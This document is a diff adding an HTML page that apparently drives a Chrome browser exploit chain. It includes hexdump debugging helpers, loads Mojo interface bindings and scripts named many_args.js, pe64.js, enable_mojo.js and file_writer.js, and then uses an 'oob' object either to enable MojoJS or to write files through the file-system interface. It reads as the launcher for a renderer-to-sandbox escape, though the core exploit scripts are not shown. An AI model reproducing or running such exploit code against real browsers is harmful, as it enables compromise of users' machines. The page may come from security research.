@@ -1,0 +1,70 @@
+<html>
+  <body>
+    <pre id='log'></pre>
+    <script>
+var keep = [];
+
+function print(string) {
+  var log = document.getElementById('log');
+  if (log) {
+    log.innerText += string + '\n';
+  }
+}
+
+function hex(value, count) {
+  const alphabet = '0123456789abcdef';
+  var result = '';
+  for (var i = (count / 4) - 1; i >= 0; --i) {
+    result += alphabet[(value >> (i * 4)) & 0xf];
+  }
+  return result;
+}
+
+function hexdump(view, base=0n) {
+  output = '';
+  ascii = '';
+  for (var i = 0; i < view.byteLength; ++i) {
+    if (i % 16 == 0) {
+      output += (base + BigInt(i)).toString(16) + ':  ';
+    }
+    byte = view.getUint8(i);
+    output += hex(byte, 8) + ' ';
+    if (0x20 <= byte && byte <= 0x7e) {
+      ascii += String.fromCharCode(byte);
+    } else {
+      ascii += '.';
+    }
+
+    if (i % 16 == 15) {
+      output += ' ' + ascii + '\n';
+      ascii = '';
+    }
+  }
+
+  if (i % 16 != 15) {
+    for (var j = i % 16; j < 16; ++j) {
+      output += '   ';
+    }
+    output += ' ' + ascii + '\n';
+  }
+
+  return output;
+}
+    </script>
+    <script src="/mojo/public/js/mojo_bindings.js"></script>
+    <script src="/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+    <script src="/third_party/blink/public/mojom/filesystem/file_system.mojom.js"></script>
+    <script src="/many_args.js"></script>
+    <script src="/pe64.js"></script>
+    <script src="/enable_mojo.js"></script>
+    <script src="/file_writer.js"></script>
+    <script>
+let oob = new many_args();
+if (typeof(Mojo) !== "undefined") {
+  file_writer(oob);
+} else {
+  enable_mojo(oob);
+}
+    </script>
+  </body>
+</html>
